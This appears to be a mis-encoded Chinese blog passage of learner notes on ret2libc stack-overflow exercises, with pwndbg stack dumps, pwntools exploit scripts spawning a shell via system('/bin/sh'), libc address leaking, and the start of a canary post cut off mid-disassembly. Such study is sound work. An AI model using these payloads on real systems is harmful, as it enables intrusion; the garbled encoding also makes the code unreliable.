123456789101112131415161718192021222324252627282930313233å’Œpwnå…¥é—¨-1-åˆè¯†é‡Œé¢çš„ä¾‹å­ä¸€æ ·,eaxä½œä¸ºå­—ç¬¦ä¸²çš„å¼€å§‹åœ°å€,ä¸€ç›´å¾€ä¸Šèµ°åˆ°ebp,æ‰€ä»¥å¯ä»¥åœ¨getsè¿™é‡Œä¸‹æ–­ç‚¹,è¾“å…¥ä¸€äº›a,ç„¶åæŸ¥çœ‹æ ˆçš„å¸ƒå±€å³å¯    0x8048677  &lt;main+95&gt;                  lea    eax, [esp + 0x1c]0x804867b  &lt;main+99&gt;                  mov    dword ptr [esp], eax0x804867e  &lt;main+102&gt;                 call   gets@plt                     &lt;gets@plt&gt;    pwndbg&gt; stack00:0000â”‚ esp 0xffffd540 â€”â–¸ 0xffffd55c â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;01:0004â”‚     0xffffd544 â—‚â€” 0x002:0008â”‚     0xffffd548 â—‚â€” 0x103:000câ”‚     0xffffd54c â—‚â€” 0x004:0010â”‚     0xffffd550 â—‚â€” 0x005:0014â”‚     0xffffd554 â—‚â€” 0x2c307d /* &#x27;&#125;0,&#x27; */06:0018â”‚     0xffffd558 â—‚â€” 0x007:001câ”‚ eax 0xffffd55c â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;pwndbg&gt;08:0020â”‚  0xffffd560 â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;... â†“     7 skippedpwndbg&gt;10:0040â”‚  0xffffd580 â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;... â†“     7 skippedpwndbg&gt;18:0060â”‚  0xffffd5a0 â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;... â†“     7 skippedpwndbg&gt;20:0080â”‚     0xffffd5c0 â—‚â€” &#x27;aaaaaaaa&#x27;21:0084â”‚     0xffffd5c4 â—‚â€” &#x27;aaaa&#x27;22:0088â”‚ ebp 0xffffd5c8 â—‚â€” 0x023:008câ”‚     0xffffd5cc â€”â–¸ 0xf7dfdfa1 (__libc_start_main+241) â—‚â€” add    esp, 0x1024:0090â”‚     0xffffd5d0 â—‚â€” 0x1   

â€‹		ä¸Šè¿°ä¾‹å­ä¸­è¾“å…¥äº†108ä¸ªa,æ‰€ä»¥ç¼“å†²åŒºæ˜¯108,ç„¶åebpå 4ä½,ç„¶åå°±æ˜¯è¿”å›åœ°å€äº†
123456789from pwn import *sh  = process(&quot;./ret2libc1&quot;)binsh = 0x08048720system = 0x08048460payload = b&quot;a&quot;*112 + p32(system) + b&quot;b&quot;*4 + p32(binsh) sh.send(payload)sh.interactive()



â€‹		
â€‹	
å‡½æ•°è°ƒç”¨ã€åºè¨€ä¸åè®°â€‹	ã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®ºæ·±åº¦å®è·µã€‹p99.
å‡½æ•°è°ƒç”¨â€‹		ä¸ºä»€ä¹ˆsystemåé¢æ˜¯exit(å°±æ˜¯è¿”å›åœ°å€),è¿™æ˜¯å› ä¸ºæ­£å¸¸æƒ…å†µä¸‹,æˆ‘ä»¬åœ¨call ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™,ä¹Ÿå°±æ˜¯ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™,ä¼šæŠŠå®ƒçš„è¿”å›åœ°å€å‹å…¥æ ˆä¸­,ç­‰è¿”å›çš„æ—¶å€™å–ç”¨,ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¸æ˜¯æ­£å¸¸çš„call,è€Œæ˜¯ç›´æ¥è¦†ç›–æ‰äº†è¿”å›åœ°å€,æ‰€ä»¥å°±æ²¡æœ‰å‹æ ˆçš„é‚£ä¸ªæ“ä½œäº†,æ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æŠŠè¿”å›åœ°å€å†™å…¥é‡Œé¢. æ­¤æ—¶push è¿”å›åœ°å€è¿›å»å,espå°±æ˜¯ä¸‹é¢åºè¨€çš„açŠ¶æ€
åºè¨€â€‹		åºè¨€å°±æ˜¯å‡½æ•°å¼€å¤´å¤„çš„ä»£ç ,ç”¨äºä¸ºå‡½æ•°å‡†å¤‡æ ˆå’ŒæŒ‡é’ˆ. IA-32(32ä½x86)ä½“ç³»ç»“æ„ä¸­,åºè¨€å†…è®¾æŒ‡ä»¤ä¸ºenter,å…·ä½“æ˜¯ä¸‹é¢ä¸‰æ¡æŒ‡ä»¤
123pushl %ebp  //ä¿å­˜è°ƒç”¨è€…çš„ebpå€¼(ç”¨äºè¢«è°ƒç”¨å‡½æ•°ç»“æŸå,æ¢å¤ä¹‹å‰è°ƒç”¨å‡½æ•°çš„æ ˆå¸§)movl %esp, %ebp //æŠŠespèµ‹å€¼ç»™ebp,è¿™æ ·ebpå°±åˆ°äº† è¢«è°ƒç”¨å‡½æ•°çš„æ ˆå¸§äº†subl %N, %esp  //ç»™å±€éƒ¨å˜é‡å¼€è¾Ÿä¸€å—ç©ºé—´




åè®°â€‹			å‡½æ•°æœ«å°¾å¤„çš„ä»£ç ,ç”¨äºæ¢å¤æ ˆå’Œå¯„å­˜å™¨åˆ°å‡½æ•°è°ƒç”¨ä¹‹å‰çš„çŠ¶æ€. IA-32(32ä½x86)ä½“ç³»ç»“æ„ä¸­,åè®°å†…è®¾æŒ‡ä»¤æ˜¯leave,å…·ä½“å†…å®¹æ˜¯ä¸‹é¢ä¸‰æ¡æŒ‡ä»¤
123movl %ebp, %esp //æŠŠebpçš„å€¼èµ‹å€¼ç»™esp,é‡Šæ”¾æ‰å¼€è¾Ÿçš„æ ˆç©ºé—´popl %ebp  //è®©ebpæŒ‡å›è°ƒç”¨è€…å‡½æ•°çš„æ ˆå¸§ret        //è¿”å›  retåŒ…å«äº†ä¸¤æ¡æŒ‡ä»¤,pop å’Œ jump(å‚ä¸Š)




ç¤ºä¾‹â€‹		ç¤ºä¾‹ç¨‹åº
1234567891011void foo(int x)&#123;        int a;        a = x;&#125;void bar()&#123;        int b=5;        foo(b);&#125;

â€‹		gcc -m32 -S prog.c ç¼–è¯‘æˆæ±‡ç¼–ä»£ç 
123456789101112131415161718foo:	pushl	%ebp	movl	%esp, %ebp	subl	$16, %esp	movl	8(%ebp), %eax	movl	%eax, -4(%ebp)	leave	retbar:	pushl	%ebp	movl	%esp, %ebp	subl	$16, %esp	movl	$5, -4(%ebp)	pushl	-4(%ebp)                   // è¿™ä¸€å¥æ˜¯å¹²ä»€ä¹ˆçš„?????? è¿™ä¸€å¥å’Œä¸Šä¸€å¥ç»„åˆ,å‹å…¥å‚æ•°	call	foo	addl	$4, %esp	leave	ret



123456789101112131415void foo(int x)&#123;        int a;        a = x;&#125;void bar()&#123;        int b=5;        foo(b);&#125;void main()&#123;  bar();&#125;



å…³äºå‚æ•°ç­‰å†æ€ä¹ˆå…·ä½“çš„,è¦çœ‹çœ‹ç¼–è¯‘åŸç†? ä¹‹ç±»çš„?
ret2libc2â€‹		ç›¸æ¯”ret2libc1,ret2libc2é‡Œæ²¡æœ‰&#x2F;bin&#x2F;sh,éœ€è¦æˆ‘ä»¬è‡ªå·±ä»å…¶ä»–æ¸ é“è·å–
1234567891008048490 &lt;system@plt&gt;:8048641:	e8 4a fe ff ff       	call   8048490 &lt;system@plt&gt;    08048460 &lt;gets@plt&gt;:80486ba:	e8 a1 fd ff ff       	call   8048460 &lt;gets@plt&gt;  0x0804872f : pop ebp ; ret0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0804843d : pop ebx ; ret

â€‹		å› ä¸ºret2libc2é‡Œæœ‰getså‡½æ•°,æ‰€ä»¥å¯ä»¥å…ˆåˆ©ç”¨è¿™ä¸ª,è¯»å–ä¸€ä¸ª&#x2F;bin&#x2F;sh,å†™å…¥åˆ°å“ªå‘¢? å†™å…¥åˆ°bssæ®µ,ä¸ºä»€ä¹ˆå†™å…¥åˆ°bssæ®µå‘¢?bssæ®µçš„åœ°å€åˆæ€ä¹ˆé€‰å‘¢???????
â€‹		å†™å…¥è¿›å»åå†ä»è¿™é‡Œè¯»å–å°±å¯ä»¥äº†!
123456.data:0804A03F.bss:0804A040 ; ===========================================================================.bss:0804A040.bss:0804A040 ; Segment type: Uninitialized.bss:0804A040 ; Segment permissions: Read/Write

â€‹		æ‰€ä»¥payloadçš„æ„é€ 
â€‹		payload &#x3D; bâ€aâ€*112 + gets + popret + buf + system + exit + buf
â€‹		payload &#x3D; bâ€aâ€*112 + gets + system + buf + buf
â€‹		åœ¨getsçš„åé¢è¦è·Ÿä¸€ä¸ªpop xxx; ret ä¸ºä»€ä¹ˆå‘¢? å› ä¸ºè¿™é‡Œæœ¬èº«æ˜¯è¿”å›åœ°å€,åœ¨getsæ‰§è¡Œå®Œå,è¦æƒ³ç»§ç»­æ‰§è¡Œçš„è¯,éœ€è¦æŠŠåé¢çš„bufç»™å¼¹å‡ºæ¥,ç„¶åå†ret,æŠŠsystemå½“æˆè¿”å›åœ°å€? ä¸çŸ¥é“è¿™ä¹ˆç†è§£å¯¹ä¸å¯¹,å¯ä»¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹
1234567891011from pwn import *sh  = process(&quot;./ret2libc2&quot;)gets = 0x08048460system = 0x08048490buf = 0x0804A040popret = 0x0804843dpayload = b&quot;a&quot;*112 + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(0) + p32(buf)sh.send(payload)sh.interactive()

â€‹		æ„Ÿè§‰èƒ½è¡Œ,ä½†æ˜¯æœ‰ç‚¹å°é—®é¢˜,,è¿˜æœ‰é‚£è¿™ä¸ªpayloadæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å‘¢?payload &#x3D; bâ€aâ€*112 + p32(gets) + p32(system) + p32(buf) + p32(buf),å¦‚æœæŒ‰ç…§ä¸Šé¢çš„é€»è¾‘çš„è¯,æ˜¯çš„,è¿™ä¸ªpayloadæ²¡é—®é¢˜! æ‰€ä»¥,ç©¶å…¶æ ¹æœ¬æˆ‘ä»¬æ˜¯ä¼ªé€ äº†å‡½æ•°æ‰§è¡Œè¿‡ç¨‹,åªè¦ç¬¦åˆå®ƒè¿™ä¸ªæµç¨‹,ç†è§£æœ¬è´¨,æ ¹æ®å…·ä½“æƒ…å†µæ„é€ å°±å¯ä»¥äº†!!
â€‹		(ä¸è¿‡ä¸ºä»€ä¹ˆæ‰§è¡Œä¸€æ¡å‘½ä»¤å°±EOFäº†?) é‚£æ˜¯å› ä¸º systeméœ€è¦è·å–&#x2F;bin&#x2F;shâ€¦ä½ å¿˜äº†,ç›´æ¥è¾“å…¥ id  whoamiä»€ä¹ˆçš„,è‚¯å®šå°±ä¸€æ¬¡,å¯ä»¥ç›´æ¥è¾“å…¥&#x2F;bin&#x2F;sh,ä¹Ÿå¯ä»¥åœ¨expé‡Œé¢åœ¨åŠ ä¸€è¡Œ sh.send(bâ€&#x2F;bin&#x2F;shâ€)
â€‹		ä¸è¡Œ,sendä¸è¡Œ,è¦ä¸¤ä¸ªsendlineæ‰å¯ä»¥,sendå’Œsendlineè‚¯å®šæœ‰åŒºåˆ«,å›å¤´å†™pwntoolsæ—¶(pwnå…¥é—¨-6)çœ‹ä¸€ä¸‹
12345678910111213from pwn import *sh  = process(&quot;./ret2libc2&quot;)gets = 0x08048460system = 0x08048490buf = 0x0804A040popret = 0x0804872fpayload = b&quot;a&quot;*112 + p32(gets) + p32(system) + p32(buf) + p32(buf)#payload = b&quot;a&quot;*112 + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(0) + p32(buf)sh.sendline(payload)sh.sendline(b&quot;/bin/sh&quot;)sh.interactive()



ret2libc3â€‹		ç›¸æ¯”ret2libc2,systemä¹Ÿæ²¡äº†,é‚£å°±éœ€è¦ä»libcä¸­æ‰¾äº†,libcçš„è¯æ²¡æœ‰ç»™ä½ ç‰ˆæœ¬,å°±éœ€è¦æ³„éœ²ä¸ªå‡½æ•°åœ°å€,ç„¶åå»æ‰¾ç‰ˆæœ¬,æ³„æ¼çš„è¯,ç”¨putsè¾“å‡º.
â€‹		æ˜¯ä¸æ˜¯éœ€è¦å…ˆæ¢ä¸ªlibcç‰ˆæœ¬å‘¢???? è¿˜æ˜¯ä»€ä¹ˆ????????????????????&#x2F;ä¸å¯¹å‘€,æ—¢ç„¶éœ€è¦æ³„æ¼å‡½æ•°..é‚£libcç‰ˆæœ¬å°±æ˜¯å›ºå®šçš„äº†,ä¸ºä»€ä¹ˆå‘¢â€¦.æ˜¯åŠ¨æ€é“¾æ¥çš„äº‹?
â€‹		å…ˆæ‰“å°å‡ºlibc_start_main_addr å†è¯´
12345678910111213141516from pwn import *from Libcsearcher import Libcsearchersh = process(&quot;./ret2libc3&quot;)ret2libc3 = ELF(&quot;./ret2libc3&quot;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.plt[&#x27;main&#x27;]payload1 = b&quot;a&quot;*112 + puts_plt + main + libc_start_main_gotsh.sendafter(&quot;Can you find it !?&quot;,payload1)libc_start_main_addr = u32(sh.recv()[0:4])print(libc_start_main_addr)

â€‹		å¾ˆå¥‡æ€ª,è¿™ä¸ªè„šæœ¬æ„Ÿè§‰æ²¡ä»€ä¹ˆé—®é¢˜,ä½†æ˜¯ä¸è¡Œ,ä¸‹é¢çš„å´å¯ä»¥â€¦â€¦.æ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«å‘€â€¦â€¦â€¦..
1234567891011121314151617##!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr = u32(sh.recv()[0:4])print(hex(libc_start_main_addr))

sh.sendlineafter(â€˜Can you find it !?â€™, payload) 
sh.sendafter(â€œCan you find it !?â€,payload1)
åŒºåˆ«åœ¨è¿™é‡Œ!!!!!
è¿˜æœ‰å¦‚æœä¸åŠ [0:4]ä¼šæ˜¯æ€æ ·?
print(sh.recv())çœ‹çœ‹
bâ€™\xb0\xde\xdf\xf7\nNo surprise anymore, system disappeard QQ.\nCan you find it !?â€™
æ‰€ä»¥æ˜¯è¦å‰å››ä¸ªå­—èŠ‚çš„æ„æ€! 
â€‹		libcçš„é—®é¢˜å‚è§ä¸‹é¢,ç›®å‰å°±å½“å·²ç»è§£å†³libcçš„é—®é¢˜äº†,ç„¶åç»§ç»­åš,libcbaseçš„è¯å°±æ˜¯è¿™ä¸ª&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),
â€‹		ç„¶åå°±æ˜¯è·å–binshå’Œsystemçš„åœ°å€,è¿™ä¸ªå¯ä»¥ç›´æ¥ç”¨objdumpæˆ–è€…ROPgadget
â€‹		objdump -d &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep â€œsystemâ€
â€‹		ROPgadget â€“binary &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 â€“string â€˜&#x2F;bin&#x2F;shâ€™
â€‹		å…¶å®æ³„éœ²äº†åœ°å€,æ‰¾åˆ°äº†gadget,å°±æ˜¯æœ€å¼€å§‹æœ€ç®€å•çš„é‚£ä¸ªæº¢å‡ºäº†,
123456789101112131415161718192021from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./ret2libc3&quot;)ret2libc3 = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]puts_got = ret2libc3.got[&#x27;puts&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]#system_addr = libcbase + libc.dump(&quot;system&quot;)#binsh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)system_addr = 0xf7de5000 + 0x0003d3d0binsh_addr =  0xf7de5000 + 0x0017e1dbpayload = flat([&#x27;A&#x27; * 112, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()

â€‹		è™½ç„¶è¿™é‡Œæ²¡æœ‰æˆåŠŸ,ä½†è¿˜æ˜¯çœ‹çœ‹exp,ç†è§£ä¸€ä¸‹è¿™ä¸ªæ€è·¯. æ¥æ”¶åˆ°æ³„éœ²çš„åœ°å€å,ç”¨libcsearcheræœç´¢ä¸€ä¸‹,æœç´¢åˆ°äº†ä¹‹å,ç”¨libc_start_main_addr(è¿™ä¸ªå°±æ˜¯è™šæ‹Ÿåœ°å€) å‡å» __libc_start_mainçš„åœ°å€(åœ¨æ–‡ä»¶ä¸­çš„åç§»),äºæ˜¯å°±å¾—åˆ°äº†åŠ è½½libcçš„åŸºåœ°å€,å°±æ˜¯è¿™ç©æ„	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),ç„¶åå†ä»libcé‡Œé¢æœç´¢è¦ç”¨çš„å‡½æ•°æˆ–è€…å­—ç¬¦ä¸²,åŠ ä¸ŠåŠ è½½çš„åŸºåœ°å€å°±å¯ä»¥äº†.
123456789libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print &quot;get shell&quot;payload = flat([&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)





å…³äºlibcçš„é—®é¢˜â€‹		é¦–å…ˆ,ä¹‹æ‰€ä»¥è¦æ³„éœ²libcçš„ç‰ˆæœ¬æ˜¯å› ä¸º,æˆ‘ä»¬è¦æ‰“ä¸€ä¸ªè¿œç¨‹çš„æœºå™¨,è¦åˆ©ç”¨åˆ°å®ƒçš„libcåº“é‡Œçš„å‡½æ•°,ä½†æ˜¯ä¸åŒç‰ˆæœ¬çš„libcçš„å‡½æ•°ä½ç½®ç­‰æ˜¯ä¸ä¸€æ ·çš„,æ‰€ä»¥éœ€è¦æ³„éœ²è¿œç¨‹æœºå™¨çš„libcç‰ˆæœ¬,ç„¶åæœ¬åœ°patchè¿›è¡Œè°ƒè¯•,å†æ‰“è¿œç¨‹.
â€‹		åƒå¾ˆå¤šåšå®¢ä¸­çš„ä¾‹é¢˜,æ˜¯æ²¡æœ‰è¿œç¨‹ç¯å¢ƒçš„,æ‰€ä»¥å°±è‡ªå·±åˆ©ç”¨è‡ªå·±æœ¬åœ°çš„ç¯å¢ƒ,é“¾æ¥åˆ°è‡ªå·±æœ¬åœ°çš„libcä¸Š,ä¸è¿‡é—®é¢˜æ˜¯,æœ‰æ—¶å€™libcsearchæœç´¢è‡ªå·±æœ¬åœ°çš„libcæœä¸å‡ºæ¥,ç‰ˆæœ¬æ˜¯é”™çš„,ç›®å‰æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆâ€¦.å½“ç„¶è¿™äº›å·¥å…·æœ¬èº«å°±ä¸æ˜¯å®Œç¾çš„.
â€‹		è¿™ç§é¢˜çš„è¯,å¦‚æœå‡ºç°ä¸Šé¢çš„é—®é¢˜,å¯ä»¥å°±ç•¥è¿‡æœç´¢libcçš„ç¯èŠ‚,ç›´æ¥ç”¨æœ¬åœ°çš„å°±å¥½äº†.
â€‹		æŸ¥çœ‹æœ¬åœ°libcç‰ˆæœ¬
123456# ldd --versionldd (Ubuntu GLIBC 2.27-3ubuntu1.4) 2.27Copyright (C) 2018 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.Written by Roland McGrath and Ulrich Drepper.

â€‹		ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯é“¾æ¥åˆ°è¿™ä¸ªé»˜è®¤çš„,å¯ä»¥ç”¨lddæŸ¥çœ‹ä¸€ä¸‹,ç„¶åç›´æ¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ä¹Ÿå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬
12345678# ldd ret2libc3	linux-gate.so.1 (0xf7fd5000)	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7de5000)	/lib/ld-linux.so.2 (0xf7fd6000)    # /lib/i386-linux-gnu/libc.so.6 --versionGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.Copyright (C) 2018 Free Software Foundation, Inc.

â€‹		è·å–libcç‰ˆæœ¬çš„è¯å¯ä»¥æœ‰å¾ˆå¤šæ–¹å¼,å¯ä»¥åˆ°libc databaseç½‘ç«™ä¸ŠæŸ¥,ä¹Ÿå¯ä»¥ç”¨libcsearchè¿™ä¸ªåº“,ä½†ä¸ä¸€å®šç™¾åˆ†ç™¾å‡†ç¡®,
â€‹		æ¯”å¦‚ä¸Šé¢è·å–äº†libc_start_main_addrçš„åœ°å€å,å°±å¯ä»¥å»ç½‘ç«™ä¸ŠæŸ¥ https://libc.blukat.me
â€‹		ä½†æ˜¯ç¡®å®ä¸å‡†â€¦â€¦..

â€‹		æˆ–è€…ç”¨libcsearch,åœ¨ä¸Šé¢çš„ä»£ç åŸºç¡€ä¸Šå†åŠ 2è¡Œ
â€‹		libc &#x3D; LibcSearcher(â€˜__libc_start_mainâ€™, libc_start_main_addr)
â€‹		libcbase &#x3D; libc_start_main_addr - libc.dump(â€˜__libc_start_mainâ€™)
1234567891011[+] There are multiple libc that meet current constraints :0 - libc-2.30-13.fc31.i6861 - libc-2.30-2-x862 - libc-2.30-3-x863 - libc-2.30-1-x864 - libc-2.32-16.mga8.x86_64_25 - libc-2.32-17.mga8.x86_64_26 - libc-2.32-20.mga8.x86_64_27 - libc-2.32-21.mga8.x86_64_28 - libc-2.32-18.mga8.x86_64_29 - libc-2.32-19.mga8.x86_64_2

â€‹		å’±ä¹Ÿä¸çŸ¥é“ä¸ºå•¥..å°±æ˜¯ä¸å¯¹,,å¯èƒ½æ•°æ®åº“æ±‡æ€»æ²¡æ”¶å½•??ä¸å¯¹å‘€,è¿™å°±æ˜¯å¾ˆå¸¸è§çš„2.27..
æ®‹ç•™ç–‘é—®è¾“å…¥åˆ°bssæ®µä¸­çš„&#x2F;bin&#x2F;shæœ‰ä»€ä¹ˆè¦æ±‚å‘¢?å“ªé‡Œéƒ½å¯ä»¥è¾“å…¥å—?ä¸ºä»€ä¹ˆè¾“å…¥åˆ°bssæ®µ?
å¥½åƒæ˜¯pipå’Œgithubä¸‹è½½çš„libcsearchæœ‰åŒºåˆ«
è¿™ä¸ªæŸ¥çš„ä¸å‡†å¯ä»¥å»åˆ«çš„åœ°æ–¹æŸ¥,æŠŠlibc_start_main_addræ‰“å°å‡ºæ¥å,å»ä¸€äº›ç½‘å€ä¸ŠæŸ¥å¯ä»¥
https://www.jianshu.com/p/5525dde00053
ä¸ºä»€ä¹ˆnmå’Œexpé‡Œçš„è¾“å‡ºä¸ä¸€æ ·,æ˜¯å› ä¸ºä¸€ä¸ªæ˜¯é™æ€,ä¸€ä¸ªæ˜¯åŠ¨æ€åŠ è½½åçš„å—


__libc_start_main é€šè¿‡è¿™ä¸ªå¾—åˆ°libc?
https://blog.csdn.net/weixin_45309916/article/details/119481681
â€‹	
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/" title="pwnå…¥é—¨-8-osä¿æŠ¤æœºåˆ¶canary">pwnå…¥é—¨-8-osä¿æŠ¤æœºåˆ¶canary</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-18T03:05:31.000Z" title="å‘è¡¨äº 2023-02-18 11:05:31">2023-02-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-03-03T11:26:34.624Z" title="æ›´æ–°äº 2023-03-03 19:26:34">2023-03-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">åˆ†ç±»ã€ç ´è§£æ–¹æ³•
ç®€ä»‹â€‹		ä¼šæŠŠcanaryæ”¾åˆ°æ¯”è¿”å›åœ°å€è¿˜ä½çš„ä½ç½®ä¸Š,è¿™æ ·æº¢å‡ºçš„æ—¶å€™,ä»ä½åœ°å€å‘é«˜åœ°å€æº¢å‡º,å°±ä¼šè¦†ç›–æ‰canary.
ä¾‹å­
1234567#include &lt;stdio.h&gt;void main()&#123;	char buf[10];	scanf(&quot;%s&quot;,buf);&#125;




1234567# gcc -fno-stack-protector canary.c -o fno.out# python3 -c &quot;print (&#x27;a&#x27;*30)&quot; | ./fno.outSegmentation fault (core dumped)# gcc -fstack-protector canary.c -o fno.out# python3 -c &quot;print (&#x27;a&#x27;*30)&quot; | ./fno.out*** stack smashing detected ***: &lt;unknown&gt; terminatedAborted (core dumped)



â€‹		64ä½å’Œ32ä½ä¸ä¸€æ ·,ä¸‹é¢è¿›è¡Œè°ƒè¯•å’ŒæŸ¥çœ‹åæ±‡ç¼–ä»£ç æ¥çœ‹ä¸€ä¸‹
64ä½123456789101112131415161718192021222324252627pwndbg&gt; disass mainDump of assembler code for function main:   0x00005555555546da &lt;+0&gt;:	push   rbp   0x00005555555546db &lt;+1&gt;:	mov    rbp,rsp   0x00005555555546de &lt;+4&gt;:	sub    rsp,0x20         0x00005555555546e2 &lt;+8&gt;:	mov    rax,QWORD PTR fs:0x28   0x00005555555546eb &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax         0x00005555555546ef &lt;+21&gt;:	xor    eax,eax   0x00005555555546f1 &lt;+23&gt;:	lea    rax,[rbp-0x12]   0x00005555555546f5 &lt;+27&gt;:	mov    rsi,rax   0x00005555555546f8 &lt;+30&gt;:	lea    rdi,[rip+0xa5]        # 0x5555555547a4   0x00005555555546ff &lt;+37&gt;:	mov    eax,0x0   0x0000555555554704 &lt;+42&gt;:	call   0x5555555545b0 &lt;__isoc99_scanf@plt&gt;   0x0000555555554709 &lt;+47&gt;:	nop      0x000055555555470a &lt;+48&gt;:	mov    rax,QWORD PTR [rbp-0x8]=&gt; 0x000055555555470e &lt;+52&gt;:	xor    rax,QWORD PTR fs:0x28   0x0000555555554717 &lt;+61&gt;:	je     0x55555555471e &lt;main+68&gt;   0x0000555555554719 &lt;+63&gt;:	call   0x5555555545a0 &lt;__stack_chk_fail@plt&gt;      0x000055555555471e &lt;+68&gt;:	leave   0x000055555555471f &lt;+69&gt;:	retEnd of assembler dump.



â€‹		æ³¨æ„çœ‹8 17 å’Œ 48 52 61 63è¿™å‡ è¡Œ, ç¬¬ä¸€éƒ¨åˆ†æ˜¯å¼€å¤´. ä»fså¯„å­˜å™¨çš„åç§»0x28ä½ç½®å–å‡º(å…·ä½“è¯·æŸ¥é˜…å…¶ä»–èµ„æ–™)å,æ”¾å…¥rax,ç„¶åæ”¾å…¥rbp-0x8çš„ä½ç½®å­˜å‚¨canary
â€‹		å‡½æ•°è¿”å›å‰,ä»æ ˆä¸Šå–å‡ºæ¥,ç„¶ååšxorå¯¹æ¯”,å¦‚æœä¸€æ ·çš„è¯,å°±éƒ½æ˜¯0,è·³è½¬åˆ°main + 68,æ­£å¸¸ç»“æŸ,å¦‚æœä¸ä¸€æ ·çš„è¯,å°±è°ƒç”¨__stack_chk_failå‡½æ•°,æŠ¥é”™äº†.
32ä½12345678910111213141516171819202122232425262728293031323334353637383940pwndbg&gt; disass mainDump of assembler code for function main:   0x5655559d &lt;+0&gt;:	lea    ecx,[esp+0x4]   0x565555a1 &lt;+4&gt;:	and    esp,0xfffffff0   0x565555a4 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]   0x565555a7 &lt;+10&gt;:	push   ebp   0x565555a8 &lt;+11&gt;:	mov    ebp,esp   0x565555aa &lt;+13&gt;:	push   ebx   0x565555ab &lt;+14&gt;:	push   ecx   0x565555ac &lt;+15&gt;:	sub    esp,0x10   0x565555af &lt;+18&gt;:	call   0x565555f9 &lt;__x86.get_pc_thunk.ax&gt;   0x565555b4 